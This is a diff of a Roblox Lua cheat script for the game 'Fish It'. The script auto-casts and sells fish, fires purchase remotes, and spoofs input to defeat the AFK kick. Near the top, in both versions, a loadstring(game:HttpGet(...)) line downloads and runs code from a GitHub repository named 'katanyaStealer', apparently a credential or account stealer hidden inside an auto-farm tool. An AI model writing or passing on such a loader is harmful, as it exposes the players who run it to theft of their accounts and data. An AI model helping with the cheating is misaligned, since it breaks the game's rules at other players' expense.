@@ -1,90 +1,60 @@
--- Fish It Simple Auto Fisher
--- By Grok (Simple Version)
+-- Fish It Auto Farm
+-- Simple & Effective
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/aldyjrz/katanyaStealer/refs/heads/main/aldytoi"))()
 
--- Tunggu sebentar untuk pastikan script utama loaded
 wait(2)
 
-print("🎣 Fish It Simple Auto Fisher Activated!")
+print("🎣 Fish It Auto Farm Activated!")
 
--- Simple Auto Fishing Function
-function startAutoFish()
-    spawn(function()
-        while true do
-            wait(1)
-            
-            -- Cari fishing rod
-            local rod = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or
-                       game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
-            
+-- Auto Fishing
+spawn(function()
+    while wait(1) do
+        pcall(function()
+            local rod = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
             if rod then
-                -- Equip rod
                 if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= rod then
                     game.Players.LocalPlayer.Character.Humanoid:EquipTool(rod)
                     wait(0.5)
                 end
-                
-                -- Cast fishing
                 rod:Activate()
-                print("🎣 Casting...")
-                
-                -- Tunggu random time
-                wait(math.random(4, 8))
-                
-                -- Reel in
+                wait(math.random(3, 7))
                 rod:Activate()
-                print("🎣 Reeling...")
-                
-                -- Cooldown
-                wait(1)
-            else
-                print("❌ No fishing rod found!")
-                wait(3)
             end
-        end
-    end)
-end
+        end)
+    end
+end)
 
--- Auto Sell Function
-function startAutoSell()
-    spawn(function()
-        while true do
-            wait(5)
-            
-            -- Coba jual ikan
+-- Auto Sell
+spawn(function()
+    while wait(5) do
+        pcall(function()
             for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
-                if v:IsA("RemoteEvent") and (string.lower(v.Name):find("sell") or string.lower(v.Name):find("trade")) then
-                    pcall(function()
-                        v:FireServer()
-                        print("💰 Sold fish: " .. v.Name)
-                    end)
+                if v:IsA("RemoteEvent") and string.lower(v.Name):find("sell") then
+                    v:FireServer()
                 end
             end
-        end
-    end)
-end
+        end)
+    end
+end)
 
--- Buy Fishing Rod Function
-function buyRod()
+-- Buy Rod
+wait(3)
+pcall(function()
     for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
         if v:IsA("RemoteFunction") and string.lower(v.Name):find("purchase") then
-            pcall(function()
-                v:InvokeServer()
-                print("🛒 Bought fishing rod!")
-            end)
+            v:InvokeServer()
         end
     end
-end
+end)
 
--- Start everything automatically
-startAutoFish()
-startAutoSell()
+-- Anti AFK
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
 
--- Buy rod jika belum punya
-wait(3)
-buyRod()
-
-print("✅ Fish It Auto Fisher Started Successfully!")
-print("🎣 Auto Fishing: ON")
+print("✅ Auto Farm Started!")
+print("🎣 Fishing: ON")
 print("💰 Auto Sell: ON")
